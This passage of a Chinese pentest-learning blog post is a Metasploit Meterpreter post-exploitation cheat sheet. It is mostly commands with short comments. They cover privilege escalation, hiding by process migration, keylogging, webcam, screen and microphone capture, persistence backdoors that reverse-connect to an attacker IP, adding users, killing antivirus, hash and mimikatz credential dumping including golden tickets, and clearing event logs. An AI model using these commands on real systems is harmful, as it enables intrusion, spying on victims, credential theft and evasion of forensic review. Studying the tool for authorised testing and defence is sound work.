class="token function">rmdir</span> lltest2             <span class="token comment"># 只能删除当前目录下文件夹</span></pre></td></tr><tr><td data-num="6"></td><td><pre>getlwd   或者 lpwd         <span class="token comment"># 操作攻击者主机 查看当前目录</span></pre></td></tr><tr><td data-num="7"></td><td><pre>lcd /tmp                  <span class="token comment"># 操作攻击者主机 切换目录</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token function">cat</span> c:<span class="token punctuation">\</span><span class="token punctuation">\</span>test<span class="token punctuation">\</span><span class="token punctuation">\</span>passwd.txt  <span class="token comment"># 查看文件内容</span></pre></td></tr><tr><td data-num="9"></td><td><pre>upload <span class="token operator">&lt;</span>本机路径<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>靶机路径<span class="token operator">&gt;</span>  <span class="token comment"># 上传文件到目标机上，如：</span></pre></td></tr><tr><td data-num="10"></td><td><pre>upload /tmp/hack.txt C:<span class="token punctuation">\</span><span class="token punctuation">\</span>test </pre></td></tr><tr><td data-num="11"></td><td><pre>download <span class="token operator">&lt;</span>靶机路径<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>本机路径<span class="token operator">&gt;</span>   <span class="token comment"># 下载文件到本机上，如：</span></pre></td></tr><tr><td data-num="12"></td><td><pre>download c:<span class="token punctuation">\</span><span class="token punctuation">\</span>test<span class="token punctuation">\</span><span class="token punctuation">\</span>passwd.txt /tmp/</pre></td></tr><tr><td data-num="13"></td><td><pre>edit <span class="token operator">&lt;</span>靶机file<span class="token operator">&gt;</span>            <span class="token comment"># 编辑或创建文件  没有的话，会新建文件</span></pre></td></tr></tbody></table></figure><h2 id="系统命令"><a class="anchor" href="#系统命令">#</a> 系统命令</h2>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>getsystem       <span class="token comment"># 会自动利用各种各样的系统漏洞来进行权限提升</span></pre></td></tr><tr><td data-num="2"></td><td><pre>getuid          <span class="token comment"># 查看对方正在运行的用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">ps</span>              <span class="token comment"># 列出所有的进程</span></pre></td></tr><tr><td data-num="4"></td><td><pre>getpid          <span class="token comment"># 返回运行 meterpreter 木马的 id 号</span></pre></td></tr><tr><td data-num="5"></td><td><pre>sysinfo         <span class="token comment"># 查看系统信息和体系结构</span></pre></td></tr><tr><td data-num="6"></td><td><pre>shell           <span class="token comment"># 切换到 cmd 的系统权限方式	</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token builtin class-name">exit</span>            <span class="token comment"># 退出 shell 会话返回 meterpreter（在 shell 中）或终止 meterpreter（在 meterpreter）</span></pre></td></tr><tr><td data-num="8"></td><td><pre>migrate <span class="token operator">&lt;</span>进程id<span class="token operator">&gt;</span>    </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment"># 进程 id 进程迁移，将本进程绑定到正常的合法进程，meterpreter 木马进程迁移至其他进程中，如桌面图形化进程，从而维持权限。</span></pre></td></tr><tr><td data-num="10"></td><td><pre>arp             <span class="token comment"># 查看 arp</span></pre></td></tr><tr><td data-num="11"></td><td><pre>getdesktop      <span class="token comment"># 截取目标主机当前桌面会话窗口</span></pre></td></tr><tr><td data-num="12"></td><td><pre>run webcam <span class="token parameter variable">-p</span> /var/www    <span class="token comment"># 在 /var/www 目录监控目标主机的摄像头</span></pre></td></tr><tr><td data-num="13"></td><td><pre>keylog_recorder   <span class="token comment"># 使用 migrate 将会话迁移至 explorer.exe 的进程空间后记录键盘</span></pre></td></tr><tr><td data-num="14"></td><td><pre>background     <span class="token comment"># 把当前的会话设置为背景，需要的时候在启用</span></pre></td></tr></tbody></table></figure><p><span class="yellow">注：执行 getsystem 命令后，会显示错误，但是其实已经运行成功了！</span></p>
<details class="info"><summary>特意说一下`migrate`</summary><div>
<div class="tab" data-id="id2" data-title="绑定进程">
<p><em>再传马成功运行后，我们一般的思路首先就是隐蔽运行，然后是巩固战果等操作。</em></p>
<ul class="lvl-2">
<li class="lvl-2">
<p>隐蔽运行时我们常会用到进程迁移，将它绑定到正常的合法进程.</p>
</li>
<li class="lvl-2">
<p>在绑定目标 pid 的时候，经常会断了 shell。进程迁移后会自动关闭原来 Meterpreter 进程，没有关闭可使用  <code>kill pid</code>  命令关闭进程。</p>
</li>
<li class="lvl-2">
<p>或者使用自动迁移进程（ <code>run post/windows/manage/migrate</code> ）命令，系统会自动寻找合适的进程然后迁移。</p>
</li>
</ul>
</div>
<div class="tab" data-id="id2" data-title="[可能的意外].">
<ul class="lvl-2">
<li class="lvl-2">
<p>被绑进程级别太高，如 explorer.exe 吧，虽然它一定存在，但你真的不一定能捆上它，试着换点权限低的进程吧。</p>
</li>
<li class="lvl-2">
<p>即使你捆到了正常的进程，你能保证它下次运行时正常启着动么？在测试中仗着免杀捆到了 QQ 电脑管家的子进程上，结果在重启是，QQ 电脑管家在启动时貌似对启动项进行了检查，最终 QQ 电脑管家报错，未能正常启动，当然，我们的木马也就凉了。</p>
</li>
<li class="lvl-2">
<p>不要认为迁移进程操作是一个多么低权限随意的工作，强烈建议在此之前请做更初级的信息搜集工作，以保你此行至少不是空手而归。包括 migrate 在内，大量高权限命令或上传下载大体积文件命令都会因为双方网络质量等原因导致会话死亡，没有听错，不是完全断开，但不会再有回应。</p>
</li>
<li class="lvl-2">
<p>目标 PC 环境对木马功能影响很大，要记住，就算是 win10 也有被打开摄像头和麦的情况，就算是 winXP 也有 ps 不出来东西的情况</p>
<p>From <a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.freebuf.com/articles/web/203009.html">Metasploit 入门系列 (十)——Meterpreter (三) - FreeBuf 网络安全行业门户</a></p>
</li>
</ul>
</div>
</div></details>
<h2 id="远程桌面"><a class="anchor" href="#远程桌面">#</a> 远程桌面</h2>
<p>靶机为 windows 时使用</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>run getgui <span class="token parameter variable">-e</span>                <span class="token comment"># 开启远程桌面</span></pre></td></tr><tr><td data-num="2"></td><td><pre>enumdesktops                 <span class="token comment"># 查看可用的桌面</span></pre></td></tr><tr><td data-num="3"></td><td><pre>getdesktop                   <span class="token comment"># 获取当前 meterpreter 关联的桌面</span></pre></td></tr><tr><td data-num="4"></td><td><pre>set_desktop                  <span class="token comment"># 设置 meterpreter 关联的桌面  -h 查看帮助</span></pre></td></tr><tr><td data-num="5"></td><td><pre>screenshot                   <span class="token comment"># 截屏</span></pre></td></tr><tr><td data-num="6"></td><td><pre>use espia                    <span class="token comment"># 或者使用 espia 模块截屏  然后输入 screengrab</span></pre></td></tr><tr><td data-num="7"></td><td><pre>run vnc                      <span class="token comment"># 使用 vnc 远程桌面连接，(这方法有点问题，上传了 exe 但是启动不了)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>run sound_recorder           <span class="token comment"># 声音记录</span></pre></td></tr><tr><td data-num="9"></td><td><pre>run webcam                   <span class="token comment"># 开启摄像头</span></pre></td></tr></tbody></table></figure><h2 id="键盘-摄像头窃取"><a class="anchor" href="#键盘-摄像头窃取">#</a> 键盘、摄像头窃取</h2>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>keyscan_start                    <span class="token comment"># 开始键盘记录</span></pre></td></tr><tr><td data-num="2"></td><td><pre>keyscan_dump                     <span class="token comment"># 导出记录数据</span></pre></td></tr><tr><td data-num="3"></td><td><pre>keyscan_stop                     <span class="token comment"># 结束键盘记录</span></pre></td></tr><tr><td data-num="4"></td><td><pre>uictl  disable<span class="token punctuation">(</span>enable<span class="token punctuation">)</span> keyboard  <span class="token comment"># 禁止 (允许) 目标使用键盘</span></pre></td></tr><tr><td data-num="5"></td><td><pre>uictl  disable<span class="token punctuation">(</span>enable<span class="token punctuation">)</span> mouse     <span class="token comment"># 禁止 (允许) 目标使用鼠标</span></pre></td></tr><tr><td data-num="6"></td><td><pre>webcam_list                      <span class="token comment"># 获取目标系统的摄像头列表</span></pre></td></tr><tr><td data-num="7"></td><td><pre>webcam_snap                      <span class="token comment"># 从指定的摄像头，拍摄照片</span></pre></td></tr><tr><td data-num="8"></td><td><pre>webcam_stream                    <span class="token comment"># 从指定的摄像头，开启视频</span></pre></td></tr><tr><td data-num="9"></td><td><pre>run vnc                          <span class="token comment"># 屏幕实时监控。</span></pre></td></tr></tbody></table></figure><h2 id="植入后门"><a class="anchor" href="#植入后门">#</a> 植入后门</h2>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>run persistence –h               <span class="token comment"># 查看帮助</span></pre></td></tr><tr><td data-num="2"></td><td><pre>run persistence <span class="token parameter variable">-X</span> <span class="token parameter variable">-i</span> <span class="token number">5</span> <span class="token parameter variable">-p</span> <span class="token number">4444</span> <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.81.129</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># -X 指定启动的方式为开机自启动；-i 反向连接的时间间隔；–r 指定攻击者的 ip</span></pre></td></tr></tbody></table></figure><h2 id="运行靶机程序"><a class="anchor" href="#运行靶机程序">#</a> 运行靶机程序</h2>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment"># execute 命令用法：</span></pre></td></tr><tr><td data-num="2"></td><td><pre>execute <span class="token punctuation">[</span>参数<span class="token punctuation">]</span> <span class="token parameter variable">-f</span> 指定的可执行文件</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>-f：指定可执行文件</pre></td></tr><tr><td data-num="5"></td><td><pre>-H：创建一个隐藏进程</pre></td></tr><tr><td data-num="6"></td><td><pre>-a：传递给命令的参数</pre></td></tr><tr><td data-num="7"></td><td><pre>-i：跟进程进行交互</pre></td></tr><tr><td data-num="8"></td><td><pre>-m：从内存中执行</pre></td></tr><tr><td data-num="9"></td><td><pre>-t：使用当前伪造的线程令牌运行进程</pre></td></tr><tr><td data-num="10"></td><td><pre>-s：在给定会话中执行进程</pre></td></tr></tbody></table></figure><h2 id="添加用户"><a class="anchor" href="#添加用户">#</a> 添加用户</h2>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>run getgui <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>用户<span class="token operator">&gt;</span> <span class="token parameter variable">-p</span> <span class="token operator">&lt;</span>密码<span class="token operator">&gt;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>run getgui <span class="token parameter variable">-u</span> user1 <span class="token parameter variable">-p</span> <span class="token number">123</span>   <span class="token comment"># 添加用户，用户名 user，密码 123</span></pre></td></tr><tr><td data-num="3"></td><td><pre>run getgui <span class="token parameter variable">-f</span> <span class="token number">4444</span> –e        <span class="token comment"># 3389 端口转发到 6661</span></pre></td></tr></tbody></table></figure><h2 id="生成后门"><a class="anchor" href="#生成后门">#</a> 生成后门</h2>
<p><code>meterpreter</code>  是基于 <code>内存DLL</code>  建立的连接，所以，只要目标主机关机，我们的连接就会断。</p>
<p>这篇写的太好了，直接引用</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/tomyyyyy/p/15178866.html">msfvenom—— 木马免杀篇 - tomyyyyy - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_44677409/article/details/96346481">Metasploit——msfvenom 免杀木马_-f py -o-CSDN 博客</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/qq_42094992/article/details/109004560">MSF 生成后门汇总_msfvenom linux/shell/reverse_tcp-CSDN 博客</a></p>
<h2 id="产后护理"><a class="anchor" href="#产后护理">#</a> 产后护理</h2>
<p>攻击的所有操作都被记录在了系统日志文件中，因此我们需要清理日志。</p>
<pre><code>clearev  #清除事件日志
</code></pre>
<h1 id="post模块"><a class="anchor" href="#post模块">#</a> POST 模块</h1>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>run killav        <span class="token comment"># 可能导致目标机器蓝屏死机</span></pre></td></tr><tr><td data-num="2"></td><td><pre>run post/windows/gather/enum_computers <span class="token comment"># 枚举域内所有用户，当然这里的目标机不属于任何域。</span></pre></td></tr><tr><td data-num="3"></td><td><pre>run persistence   <span class="token comment"># 将 meterpreter 木马写入硬盘，下次开机时自启</span></pre></td></tr><tr><td data-num="4"></td><td><pre>run post/multi/gather/wlan_geolocate  </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># 基于 wlan 进行地理位置确认，获得地理信息自动生成 txt 文件保在 /root/.msf6/loot 下（隐藏文件夹）</span></pre></td></tr><tr><td data-num="6"></td><td><pre>run hashdump                                            <span class="token comment"># 获取目标系统用户密码 hash</span></pre></td></tr><tr><td data-num="7"></td><td><pre>run service_manager                                     <span class="token comment"># 目标系统服务管理，-l 参数常用于信息收集</span></pre></td></tr><tr><td data-num="8"></td><td><pre>run post/windows/wlan/wlan_profile                      <span class="token comment"># 用于读取目标主机 WiFi 密码。</span></pre></td></tr><tr><td data-num="9"></td><td><pre>run post/windows/manage/migrate                			<span class="token comment"># 自动进程迁移</span></pre></td></tr><tr><td data-num="10"></td><td><pre>run post/windows/gather/checkvm                			<span class="token comment"># 查看目标主机是否运行在虚拟机上</span></pre></td></tr><tr><td data-num="11"></td><td><pre>run post/windows/manage/killav                			<span class="token comment"># 关闭杀毒软件</span></pre></td></tr><tr><td data-num="12"></td><td><pre>run post/windows/manage/enable_rdp            			<span class="token comment"># 开启远程桌面服务</span></pre></td></tr><tr><td data-num="13"></td><td><pre>run post/windows/manage/autoroute              			<span class="token comment"># 查看路由信息</span></pre></td></tr><tr><td data-num="14"></td><td><pre>run post/windows/gather/enum_logged_on_users    		<span class="token comment"># 列举当前登录的用户</span></pre></td></tr><tr><td data-num="15"></td><td><pre>run post/windows/gather/enum_applications       		<span class="token comment"># 列举应用程序</span></pre></td></tr><tr><td data-num="16"></td><td><pre>run post/windows/gather/credentials/windows_autologin 	<span class="token comment"># 抓取自动登录的用户名和密码</span></pre></td></tr><tr><td data-num="17"></td><td><pre>run post/windows/gather/smart_hashdump               	<span class="token comment"># dump 出所有用户的 hash</span></pre></td></tr></tbody></table></figure><h2 id="获取用户密码"><a class="anchor" href="#获取用户密码">#</a> 获取用户密码</h2>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>run windows/gather/credentials/windows_autologin   <span class="token comment"># 当用户自动登录时抓取密码</span></pre></td></tr><tr><td data-num="2"></td><td><pre>run hashdump  <span class="token comment"># hashdump 模块可以从 SAM 数据库中导出本地用户账号，该命令的使用前 getsystem。</span></pre></td></tr></tbody></table></figure><p>导出的数据格式是这样的：</p>
<pre><code class="language-SAM">用户名:SID:LM哈希:NTLM哈希:::
</code></pre>
<p>通过<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cmd5.com/?lailu=www.itdka.cn"> md5 在线解密破解，md5 解密加密 (cmd5.com)</a> 来查询这些哈希值</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>run windows/gather/smart_hashdump</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 需要系统权限。功能更强大，如果当前用户是域管理员用户，则可以导出域内所有用户的 hash。</span></pre></td></tr></tbody></table></figure><p>还可以通过<span class="kbd blue"> kiwi 模块</span>、<span class="kbd blue">mimikatz 模块</span>获取用户密码。</p>
<h1 id="powershell模块"><a class="anchor" href="#powershell模块">#</a> powershell 模块</h1>
<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>
<h1 id="kimimimikatz模块"><a class="anchor" href="#kimimimikatz模块">#</a> kimi（mimikatz）模块</h1>
<blockquote>
<p><strong>mimikatz 模块已经合并入 kiwi 模块中</strong></p>
</blockquote>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>creds_all：             <span class="token comment">#列举所有凭据</span></pre></td></tr><tr><td data-num="2"></td><td><pre>creds_kerberos：        <span class="token comment">#列举所有 kerberos 凭据</span></pre></td></tr><tr><td data-num="3"></td><td><pre>creds_msv：             <span class="token comment">#列举所有 msv 凭据</span></pre></td></tr><tr><td data-num="4"></td><td><pre>creds_ssp：             <span class="token comment">#列举所有 ssp 凭据</span></pre></td></tr><tr><td data-num="5"></td><td><pre>creds_tspkg：           <span class="token comment">#列举所有 tspkg 凭据</span></pre></td></tr><tr><td data-num="6"></td><td><pre>creds_wdigest：         <span class="token comment">#列举所有 wdigest 凭据</span></pre></td></tr><tr><td data-num="7"></td><td><pre>dcsync：                <span class="token comment">#通过 DCSync 检索用户帐户信息</span></pre></td></tr><tr><td data-num="8"></td><td><pre>dcsync_ntlm：           <span class="token comment">#通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID</span></pre></td></tr><tr><td data-num="9"></td><td><pre>golden_ticket_create：  <span class="token comment">#创建黄金票据</span></pre></td></tr><tr><td data-num="10"></td><td><pre>kerberos_ticket_list：  <span class="token comment">#列举 kerberos 票据</span></pre></td></tr><tr><td data-num="11"></td><td><pre>kerberos_ticket_purge： <span class="token comment">#清除 kerberos 票据</span></pre></td></tr><tr><td data-num="12"></td><td><pre>kerberos_ticket_use：   <span class="token comment">#使用 kerberos 票据</span></pre></td></tr><tr><td data-num="13"></td><td><pre>kiwi_cmd：              <span class="token comment">#执行 mimikatz 的命令，后面接 mimikatz.exe 的命令</span></pre></td></tr><tr><td data-num="14"></td><td><pre>lsa_dump_sam：          <span class="token comment">#dump 出 lsa 的 SAM</span></pre></td></tr><tr><td data-num="15"></td><td><pre>lsa_dump_secrets：      <span class="token comment">#dump 出 lsa 的密文</span></pre></td></tr><tr><td data-num="16"></td><td><pre>password_change：       <span class="token comment">#修改密码</span></pre></td></tr><tr><td data-num="17"></td><td><pre>wifi_list：             <span class="token comment">#列出当前用户的 wifi 配置文件</span></pre></td></tr><tr><td data-num="18"></td><td><pre>wifi_list_shared：      <span class="token comment">#列出共享 wifi 配置文件 / 编码</span></pre></td></tr></tbody></table></figure><p>kiwi_cmd 模块可以让我们使用 mimikatz 的全部功能，该命令后面接 mimikatz.exe 的命令:</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>kiwi_cmd sekurlsa::logonpasswords</pre></td></tr></tbody></table></figure><h1 id="stdapi模块"><a class="anchor" href="#stdapi模块">#</a> stdapi 模块</h1>
<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>
<h1 id="令牌假冒"><a class="anchor" href="#令牌假冒">#</a> 令牌假冒</h1>
<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>
<h1 id="pivot代理"><a class="anchor" href="#pivot代理">#</a> pivot 代理</h1>
<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/diligenceday/p/11028462.html">超实用！手把手教你如何用 MSF 进行后渗透测试！ - 方方和圆圆 - 博客园 (cnblogs.com)</a></p>
<h1 id="自定义攻击模块"><a class="anchor" href="#自定义攻击模块">#</a> 自定义攻击模块</h1>
<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>
<p><mark><strong>不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。</strong></mark></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>我们也可以将攻击代码写入 <code>configure.rc</code> （只要是以 <code>.rc</code>  结尾的文件）配置文件中，</p>
</li>
<li class="lvl-2">
<p>然后使用命令 <code>msfconsole -r configure.rc</code>  进行自动攻击</p>
<p>参考这篇文章<a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_45588247/article/details/119488520?spm=1001.2014.3001.5501">【漏洞复现】RDP 远程桌面漏洞复现 (CVE-2019-0708)_exploit/cve-2019-0708-CSDN 博客</a></p>
</li>
</ul>
<h1 id="小试牛刀"><a class="anchor" href="#小试牛刀">#</a> 小试牛刀</h1>
<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>
<h1 id="msf-gui图形化界面"><a class="anchor" href="#msf-gui图形化界面">#</a> MSF-GUI 图形化界面</h1>
<p>抱歉😵‍💫😵‍💫这里还是作者的知识荒原🥹🥹</p>
<p>安装教程<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.yuque.com/vipersec/install/olg1ua">首次安装 (yuque.com)</a></p>
<p>用安装教程脚本自动化安装可以不用繁琐的手动部署，也可以不用 git clone。懒人就要懒到极致。</p>
<p><span class="spoiler" title="你知道得太多了">还没用过，看着好屌。</span></p>
<p>项目地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/FunnyWolf/Viper">FunnyWolf/Viper: Attack Surface Management &amp; Red Team Simulation Platform 互联网攻击面管理 &amp; 红队模拟平台 (github.com)</a></p>
<h1 id="with-powers-comes-responsilities"><a class="anchor" href="#with-powers-comes-responsilities">#</a> With Powers Comes Responsilities</h1>
<h2 id="metasploit的强大"><a class="anchor" href="#metasploit的强大">#</a> Metasploit 的强大</h2>
<p>初步学习完 Metasploit 感觉到它的强大之处，会不会有当 GPT 学会 msf 之后乱杀世界一切生灵的惶恐？或许我才意识到这就是网安人的使命吧。</p>
<p><img loading="lazy" data-src="https://s2.loli.net/2024/05/05/A8yelkGqMTRvP6a.jpg" alt="With Great Rower Comes Great Responsibilities"></p>
<p>与君共勉。</p>
<h1 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接</h1>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://t.csdnimg.cn/mxbtk">http://t.csdnimg.cn/mxbtk</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://t.csdnimg.cn/PPj38">http://t.csdnimg.cn/PPj38</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://t.csdnimg.cn/ucKKL">http://t.csdnimg.cn/ucKKL</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/qq_43307937/article/details/109701503">Meterpreter 的常用命令合集_meterpreter 命令大全 - CSDN 博客</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_45588247/article/details/119519411?spm=1001.2014.3001.5501">【工具使用】——MSF 使用_使用 MSF 抓取用户密码_msf 读取 windows 密码 - CSDN 博客</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_45588247/article/details/119497964">【工具使用】——MSF 使用_MSF 中 kiwi (mimikatz) 模块的使用_load kiwi-CSDN 博客</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_45588247/article/details/119614618#t13">【工具使用】——Metasploit (MSF) 使用详解 (超详细)-CSDN 博客</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.freebuf.com/column/203008.html">Metasploit 入门系列 (九)——Meterpreter (二) - FreeBuf 网络安全行业门户</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/dogecheng/p/11478953.html">MSF——Payload 模块（二） - 那少年和狗 - 博客园 (cnblogs.com)</a></p>
<div class="tags"><a href="/tags/kali-tools/" rel="tag"><i class="ic i-tag"></i>kali tools</a><a href="/tags/Penetration-Test/" rel="tag"><i class="ic i-tag"></i>Penetration Test</a></div></div><footer><div class="meta"><span class="icon"><i class="ic i-eye"></i></span><span>此文章已被阅读次数:</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="post/MSF-万千waf中取ROOT首级/">正在加载...</span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2024-05-05 22:39:51" itemprop="dateModified" datetime="2024-05-05T22:39:51+08:00">2024-05-05</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img loading="lazy" data-src="/assets/wechatpay.webp" alt="MorIo24 微信支付"><p>微信支付</p></div><div><img loading="lazy" data-src="/assets/alipay.webp" alt="MorIo24 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>MorIo24<i class="ic i-at"><em>@</em></i>Glad to see U (◦˙▽˙◦)</li><li class="link"><strong>本文链接：</strong><a href="https://ctf-learner.github.io/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/" title="MSF---万千waf中取ROOT首级">https://ctf-learner.github.io/post/MSF-万千waf中取ROOT首级/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/post/AWD-waf%E8%84%9A%E6%9C%AC/" rel="prev" itemprop="url" data-background-image="https://s2.loli.net/2024/04/15/KrhGDNnescg7Elv.webp" title="AWD-waf脚本"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>AWD</span><h3>AWD-waf脚本</h3></a></div><div class="item right"><a href="/post/Get-Earth-Shell/" rel="next" itemprop="url" data-background-image="https://s2.loli.net/2024/04/13/PhkmpOa3nrxzVMu.jpg" title="Get Earth Shell"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>Penetration Test</span><h3>Get Earth Shell</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#metasploit%E5%B7%A5%E5%85%B7"><span class="toc-number">1.</span> <span class="toc-text"> Metasploit 工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text"> 基础使用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96metasploit"><span class="toc-number">3.</span> <span class="toc-text"> 初始化 metasploit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5msf"><span class="toc-number">4.</span> <span class="toc-text"> 进入 msf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%B7%A5%E4%BD%9C%E5%8C%BA"><span class="toc-number">5.</span> <span class="toc-text"> 创建工作区</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A"><span class="toc-number">6.</span> <span class="toc-text"> 导入扫描报告</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%9F%A5%E8%AF%A2"><span class="toc-number">7.</span> <span class="toc-text"> 手动查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-number">8.</span> <span class="toc-text"> 使用模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#payload"><span class="toc-number">9.</span> <span class="toc-text"> payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87cve%E7%BD%91%E7%AB%99%E6%9F%A5%E6%89%BE"><span class="toc-number">10.</span> <span class="toc-text"> 通过 CVE 网站查找</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5"><span class="toc-number">11.</span> <span class="toc-text"> 后渗透阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">11.1.</span> <span class="toc-text"> 基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">11.2.</span> <span class="toc-text"> 文件操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">11.3.</span> <span class="toc-text"> 系统命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">11.4.</span> <span class="toc-text"> 远程桌面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%AE%E7%9B%98-%E6%91%84%E5%83%8F%E5%A4%B4%E7%AA%83%E5%8F%96"><span class="toc-number">11.5.</span> <span class="toc-text"> 键盘、摄像头窃取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8"><span class="toc-number">11.6.</span> <span class="toc-text"> 植入后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E9%9D%B6%E6%9C%BA%E7%A8%8B%E5%BA%8F"><span class="toc-number">11.7.</span> <span class="toc-text"> 运行靶机程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span 